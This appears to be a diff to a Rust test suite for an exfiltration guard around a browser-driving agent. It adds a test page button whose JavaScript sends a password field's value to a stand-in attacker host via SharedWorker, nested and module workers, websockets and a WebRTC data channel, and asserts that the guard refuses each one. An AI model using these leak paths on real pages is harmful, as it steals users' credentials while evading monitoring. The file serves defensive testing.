@@ -36,7 +36,25 @@ var b=new WebSocket('{ws}/wb');b.onopen=function(){{b.send(new Blob([v]))}};
 new EventSource('{evil}/es?d='+encodeURIComponent(v));
 var src='onmessage=function(e){{var v=e.data;fetch(\'{evil}/wf?d=\'+encodeURIComponent(v));var w=new WebSocket(\'{ws}/ww\');w.onopen=function(){{w.send(v)}};}}';
 var k=new Worker(window.URL.createObjectURL(new Blob([src])));k.postMessage(v);
-">Exfil2</button></body></html>"#
+">Exfil2</button>
+<button type="button" id="x3" onclick="
+var v=document.getElementById('pw').value;
+function wsleak(path){{return 'var w=new WebSocket(\''+'{ws}'+path+'\');w.onopen=function(){{w.send(DATA)}};'}}
+var bl=function(t){{return window.URL.createObjectURL(new Blob([t],{{type:'text/javascript'}}))}};
+var sw=new SharedWorker(bl('onconnect=function(c){{var p=c.ports[0];p.onmessage=function(e){{var DATA=e.data;'+wsleak('/sw')+'}}}}'));
+sw.port.start();sw.port.postMessage(v);
+var inner='onmessage=function(e){{var DATA=e.data;'+wsleak('/nw')+'}}';
+var nw=new Worker(bl('onmessage=function(e){{var k=new Worker(URL.createObjectURL(new Blob([e.data.s],{{type:\'text/javascript\'}})));k.postMessage(e.data.v)}}'));
+nw.postMessage({{s:inner,v:v}});
+var lib=bl('export function leak(DATA){{'+wsleak('/wm')+'}}');
+var mw=new Worker(bl('import {{leak}} from \''+lib+'\';postMessage(\'alive\');onmessage=function(e){{leak(e.data)}}'),{{type:'module'}});
+mw.onmessage=function(e){{mw.postMessage(v)}};
+var a=new RTCPeerConnection(),b=new RTCPeerConnection();
+a.onicecandidate=function(e){{e.candidate&&b.addIceCandidate(e.candidate)}};b.onicecandidate=function(e){{e.candidate&&a.addIceCandidate(e.candidate)}};
+b.ondatachannel=function(e){{e.channel.onmessage=function(m){{fetch('{evil}/rtc?d='+encodeURIComponent(m.data))}}}};
+var ch=a.createDataChannel('x');ch.onopen=function(){{ch.send(v)}};
+a.createOffer().then(function(o){{return a.setLocalDescription(o).then(function(){{return b.setRemoteDescription(o)}}).then(function(){{return b.createAnswer()}}).then(function(an){{return b.setLocalDescription(an).then(function(){{return a.setRemoteDescription(an)}})}})}});
+">Exfil3</button></body></html>"#
     )
 }
 
@@ -67,16 +85,24 @@ fn conn(mut s: TcpStream, lg: Log, html: Arc<Mutex<String>>) {
         .to_ascii_lowercase()
         .contains("upgrade: websocket")
     {
-        if let Ok(mut ws) = tungstenite::accept(s) {
+        let path = Arc::new(Mutex::new(String::new()));
+        let pc = path.clone();
+        let cb = move |r: &tungstenite::handshake::server::Request,
+                       resp: tungstenite::handshake::server::Response| {
+            *pc.lock().unwrap() = r.uri().path().to_string();
+            Ok(resp)
+        };
+        if let Ok(mut ws) = tungstenite::accept_hdr(s, cb) {
+            let path = path.lock().unwrap().clone();
             while let Ok(m) = ws.read() {
                 match m {
                     tungstenite::Message::Text(t) => {
-                        lg.lock().unwrap().push(format!("WS frame {t}"))
+                        lg.lock().unwrap().push(format!("WS frame {path} {t}"))
                     }
                     tungstenite::Message::Binary(b) => lg
                         .lock()
                         .unwrap()
-                        .push(format!("WS frame {}", String::from_utf8_lossy(&b))),
+                        .push(format!("WS frame {path} {}", String::from_utf8_lossy(&b))),
                     _ => {}
                 }
             }
@@ -309,6 +335,15 @@ fn run(chrome: bool, mutate: bool, keyring: bool) -> Outcome {
         );
         std::thread::sleep(std::time::Duration::from_millis(2500));
     }
+    if chrome {
+        // W3.16.b.a: SharedWorker, nested worker, module worker with a static import, WebRTC data channel.
+        step(
+            &mut c,
+            "act",
+            json!({"handle": handle_of(&nav, "\"Exfil3\""), "action": "click"}),
+        );
+        std::thread::sleep(std::time::Duration::from_millis(4000));
+    }
     step(&mut c, "observe", json!({}));
     step(
         &mut c,
@@ -377,6 +412,17 @@ fn assert_green(chrome: bool, keyring: bool) {
         assert!(
             wsf >= 3,
             "want >=3 WS-frame refusals (text, Blob, worker), got {wsf}: {:#?}",
+            o.refusals
+        );
+        // W3.16.b.a: SharedWorker, nested worker, module worker and each WebRTC data channel are refused too.
+        assert!(
+            wsf >= 6,
+            "want >=6 WS-frame refusals incl. SharedWorker, nested, module worker, got {wsf}: {:#?}",
+            o.refusals
+        );
+        assert!(
+            o.refusals.iter().any(|r| r.contains("WebRTC data channel")),
+            "no logged WebRTC data channel refusal: {:#?}",
             o.refusals
         );
         assert!(
@@ -507,6 +553,27 @@ fn guard_off_chrome_run_leaks_the_w316b_channels() {
         assert!(
             o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
             "chrome mutant lacks {ch}: {:#?}",
+            o.evil
+        );
+    }
+}
+
+#[test]
+fn guard_off_chrome_run_leaks_the_w316ba_channels() {
+    let o = run(true, true, false);
+    for ch in ["WS frame", "GET /rtc?"] {
+        assert!(
+            o.evil.iter().any(|l| l.contains(ch) && l.contains(SECRET)),
+            "chrome mutant lacks {ch}: {:#?}",
+            o.evil
+        );
+    }
+    for p in ["/sw", "/nw", "/wm"] {
+        assert!(
+            o.evil
+                .iter()
+                .any(|l| l.starts_with(&format!("WS frame {p} ")) && l.contains(SECRET)),
+            "chrome mutant lacks WS {p}: {:#?}",
             o.evil
         );
     }
